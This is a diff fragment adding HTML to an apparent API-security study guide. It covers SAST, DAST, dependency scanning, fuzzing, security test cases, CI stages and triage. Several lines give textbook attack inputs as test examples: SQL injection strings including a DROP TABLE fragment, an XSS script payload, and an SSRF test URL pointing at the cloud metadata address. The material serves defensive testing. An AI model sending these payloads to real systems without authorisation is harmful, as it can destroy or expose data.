+              <td><strong>Contract tests</strong></td>
+              <td>API contract violations, schema breaks, compatibility</td>
+              <td>Security-specific bugs</td>
+              <td>Pact, Schemathesis, Dredd (Volume 3, Question 9)</td>
+            </tr>
+            <tr>
+              <td><strong>Security integration tests</strong></td>
+              <td>The specific bugs the API can have — BOLA, mass assignment, enumeration, race conditions</td>
+              <td>Unknown vulnerabilities</td>
+              <td>Application-specific tests using the framework</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>SAST — static analysis</h4>
+      <p>SAST scans source code without running it. The value is finding known-bad patterns:</p>
+      <ul>
+        <li><strong>Injection sinks</strong> — string concatenation in a SQL query, <code>exec(userInput)</code>,
+        <code>eval()</code> with user data.</li>
+        <li><strong>Hardcoded secrets</strong> — API keys, passwords, tokens in the source.</li>
+        <li><strong>Missing authentication</strong> — a route without the auth middleware.</li>
+        <li><strong>Dangerous functions</strong> — <code>pickle.load</code>, <code>Marshal.load</code>,
+        <code>ObjectInputStream</code>, <code>innerHTML</code>.</li>
+        <li><strong>Insecure configuration</strong> — <code>verify=False</code> on TLS, <code>CORS: *</code> with
+        credentials.</li>
+      </ul>
+      <p>The limitations: SAST produces false positives (it does not understand the application's logic), it
+      misses runtime issues (the code looks safe, the configuration is not), and it cannot find the business
+      logic bugs (BOLA, race conditions). It is a first line, not the only line.</p>
+      <p>The integration: run SAST on every PR; fail the build on high-severity findings; use a baseline (only
+      new findings fail) to avoid drowning in legacy issues.</p>
+
+      <h4>DAST — dynamic analysis</h4>
+      <p>DAST sends requests to a running instance — typically a staging deployment — with attack payloads and
+      analyzes the responses:</p>
+      <ul>
+        <li><strong>Injection</strong> — send <code>' OR '1'='1</code>, <code>1; DROP TABLE</code>, and look for
+        error messages or unexpected behaviour.</li>
+        <li><strong>XSS</strong> — send <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> and look for it in the
+        response unencoded.</li>
+        <li><strong>Missing headers</strong> — check for <code>Strict-Transport-Security</code>,
+        <code>X-Content-Type-Options</code>, <code>Content-Security-Policy</code>.</li>
+        <li><strong>Misconfigurations</strong> — open directory listing, default credentials, exposed admin
+        paths.</li>
+        <li><strong>Auth bypass</strong> — access protected endpoints without a token; use expired or
+        tampered tokens.</li>
+      </ul>
+      <p>The limitation: DAST sees only what the scanner knows to test. It does not know the API's business
+      logic, the specific object IDs, or the specific authorization model. It catches the generic vulnerabilities
+      (injection, XSS, missing headers) but not the application-specific ones (BOLA, mass assignment).</p>
+      <p>The integration: DAST runs against the staging environment on a schedule (nightly, or on every merge
+      to main); the findings are triaged; high-severity findings block deployment.</p>
+
+      <h4>Dependency scanning</h4>
+      <p>Third-party libraries are the source of many vulnerabilities — the Log4Shell incident (CVE-2021-44228)
+      affected every Java application using a specific version of Log4j; the event-stream incident (npm)
+      involved a malicious package; the PyPI typosquatting attacks are constant.</p>
+      <p>The tooling:</p>
+      <ul>
+        <li><strong>Dependabot</strong> (GitHub) — automated PRs for vulnerable dependencies.</li>
+        <li><strong>Snyk</strong> — SCA (Software Composition Analysis) with vulnerability data and fix
+        suggestions.</li>
+        <li><strong>Trivy</strong> — scans container images, filesystems, and Git repos.</li>
+        <li><strong>OWASP Dependency-Check</strong> — identifies project dependencies and checks for known
+        CVEs.</li>
+        <li><strong>Grype</strong> — container and filesystem scanner.</li>
+      </ul>
+      <p>The integration: run on every PR and on a schedule; alert on new CVEs in the dependency tree; have a
+      policy for update cadence and for which CVEs are acceptable risks.</p>
+
+      <h4>Fuzzing</h4>
+      <p>Fuzzing generates random or semi-random input and looks for crashes, hangs, and unexpected
+      behaviour:</p>
+      <ul>
+        <li><strong>Input fuzzing</strong> — send malformed JSON, wrong types, huge values, unusual encodings;
+        look for 500s (unhandled exceptions), hangs, or memory exhaustion.</li>
+        <li><strong>Property-based testing</strong> — Hypothesis (Python), QuickCheck (Haskell), fast-check
+        (TypeScript) — generate inputs satisfying a property and check the property holds.</li>
+        <li><strong>Coverage-guided fuzzing</strong> — AFL++, libFuzzer — mutate the input to maximise code
+        coverage; find the deep crashes.</li>
+      </ul>
+      <p>The integration: fuzz the parsers, the serializers, the input validators, and the API's edge cases. A
+      parser that crashes on a malformed input is a DoS; a validator that hangs on a crafted input is a DoS; a
+      serializer that produces invalid output is a data-corruption bug.</p>
+
+      <h4>The application-specific tests</h4>
+      <p>The generic tools do not catch the API-specific vulnerabilities. Those need tests written for the
+      application:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Test</th><th>What it verifies</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Two-account test</strong></td>
+              <td>Account A cannot access account B's resource (BOLA)</td>
+            </tr>
+            <tr>
+              <td><strong>Mass assignment test</strong></td>
+              <td>Sending <code>is_admin: true</code> is rejected or ignored</td>
+            </tr>
+            <tr>
+              <td><strong>Excessive exposure test</strong></td>
+              <td>The response does not contain <code>password_hash</code>, <code>ssn</code>, etc.</td>
+            </tr>
+            <tr>
+              <td><strong>Enumeration test</strong></td>
+              <td>The response to a nonexistent email is the same as for an existing one</td>
+            </tr>
+            <tr>
+              <td><strong>Race condition test</strong></td>
+              <td>Two concurrent requests produce one result, not two</td>
+            </tr>
+            <tr>
+              <td><strong>Rate limit test</strong></td>
+              <td>Exceeding the limit returns 429, not 200</td>
+            </tr>
+            <tr>
+              <td><strong>Auth bypass test</strong></td>
+              <td>Expired token, no token, tampered token — all return 401/403</td>
+            </tr>
+            <tr>
+              <td><strong>SSRF test</strong></td>
+              <td>A URL pointing to <code>169.254.169.254</code> is rejected</td>
+            </tr>
+            <tr>
+              <td><strong>Injection test</strong></td>
+              <td>Sending <code>' OR '1'='1</code> in every field does not cause an error</td>
+            </tr>
+            <tr>
+              <td><strong>XXE test</strong></td>
+              <td>An XML with a DOCTYPE is rejected</td>
+            </tr>
+            <tr>
+              <td><strong>Deserialization test</strong></td>
+              <td>A malformed serialized object is rejected</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>These tests are cheap to write (a few lines each), catch the specific vulnerabilities, and become
+      regression tests — once fixed, the test prevents the bug from returning.</p>
+
+      <h4>The CI pipeline</h4>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Stage</th><th>What runs</th><th>Blocking?</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Pre-commit</strong></td>
+              <td>Secret scanning (git-secrets, gitleaks), lint, unit tests</td>
+              <td>Yes</td>
+            </tr>
+            <tr>
+              <td><strong>PR — build</strong></td>
+              <td>SAST, dependency scan, unit tests, contract tests</td>
+              <td>Yes — high severity</td>
+            </tr>
+            <tr>
+              <td><strong>PR — preview</strong></td>
+              <td>Deploy to preview; DAST basic scan</td>
+              <td>Advisory</td>
+            </tr>
+            <tr>
+              <td><strong>Merge to main</strong></td>
+              <td>Full DAST, fuzzing, security integration tests</td>
+              <td>Yes — high severity</td>
+            </tr>
+            <tr>
+              <td><strong>Nightly</strong></td>
+              <td>Full DAST, dependency scan, CVE check, container scan</td>
+              <td>Alerts</td>
+            </tr>
+            <tr>
+              <td><strong>Pre-deploy</strong></td>
+              <td>Security sign-off; infrastructure scan (Terraform, Kubernetes manifests)</td>
+              <td>Yes</td>
+            </tr>
+            <tr>
+              <td><strong>Post-deploy</strong></td>
+              <td>Smoke tests with attack payloads; header checks</td>
+              <td>Rollback on failure</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h4>The triage and severity</h4>
+      <p>Every finding is triaged — assigned a severity and a response time:</p>
+      <div class="table-scroll">
+        <table>
+          <thead><tr><th>Severity</th><th>Example</th><th>Response</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Critical</strong></td>
+              <td>Exploitable RCE, authentication bypass, data leak</td>
+              <td>Fix immediately; block all deploys</td>
+            </tr>
+            <tr>
+              <td><strong>High</strong></td>
+              <td>BOLA, mass assignment, SQL injection (mitigated)</td>
+              <td>Fix in the current sprint; block the affected endpoint</td>
+            </tr>
+            <tr>
+              <td><strong>Medium</strong></td>
+              <td>Missing security headers, information disclosure</td>
+              <td>Fix in the next sprint</td>
+            </tr>
+            <tr>
+              <td><strong>Low</strong></td>
+              <td>Verbose error messages, minor misconfigurations</td>
+              <td>Fix when convenient; track in the backlog</td>
+            </tr>
+            <tr>
+              <td><strong>Info</strong></td>
+              <td>Informational — not a vulnerability</td>
+              <td>Note and move on</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The policy: critical and high are blocking; medium and low are tracked. The trap is treating every
+      finding as critical (the team stops caring) or every finding as low (the real issues are missed). The
+      severity is a judgment about exploitability and impact, not about the scanner's default label.</p>
+
+      <h4>The audit and response</h4>
+      <p>Security testing finds bugs; finding them is only half the work. The other half:</p>
+      <ul>
+        <li><strong>A process for fixing</strong> — a ticket, an owner, a deadline.</li>
+        <li><strong>A process for verifying</strong> — the test that caught the bug becomes the regression
+        test; the fix is confirmed.</li>
+        <li><strong>A process for disclosing</strong> — if the bug affected production, the disclosure policy
+        and the customer notification.</li>
+        <li><strong>A process for learning</strong> — a postmortem; a design change that prevents the class of
+        bug, not just the instance.</li>
+      </ul>
+
+      <div class="callout pitfall">
+        <span class="label">Common Pitfall</span>
+        <p>Running SAST and DAST and assuming the API is tested. The tools catch the generic vulnerabilities;
+        the application-specific ones (BOLA, mass assignment, race conditions) require tests written for the
+        application. The two-account test, the mass-assignment test, the concurrency test — these are what
+        catch the OWASP API Top 10 items the scanners miss.</p>
+      </div>
+
+      <div class="callout tip">
+        <span class="label">Interview Framing</span>
+        <p>Say: "Four layers: SAST for code patterns, DAST for runtime vulnerabilities, dependency scanning for
+        CVEs, fuzzing for crashes. Plus the application-specific tests — two-account BOLA, mass assignment,
+        enumeration, race conditions — that catch the OWASP API Top 10 items the tools miss. High-severity
+        findings block deployment; everything is tracked and fixed." That covers the layers and the discipline.</p>
+      </div>
+    </div>
+  </article>
+
+  <!-- NEXT PART -->
+  <section class="next-part">
+    <h3>Coming in Volume 15 — Observability &amp; Operations</h3>
+    <p>Volume 15 turns to operating an API in production: the three pillars (metrics, logs, traces), SLIs,
+    SLOs, and error budgets, the dashboard and alert design, incident response, postmortems, and the
+    deployment practices that keep an API available through changes.</p>
+    <ul class="next-list">
+      <li>Metrics, logs, traces — the three pillars</li>
+      <li>RED and USE metrics</li>
+      <li>SLIs, SLOs, SLAs, and error budgets</li>
+      <li>Alert design — symptoms, not causes</li>
+      <li>Dashboards that answer questions</li>
+      <li>Distributed tracing and correlation</li>
+      <li>Incident response and runbooks</li>
+      <li>Postmortems and blameless culture</li>
+      <li>Deployment strategies and rollback</li>
+      <li>Chaos engineering and game days</li>
+    </ul>
+  </section>
+
+</div>
+</body>
+</html>
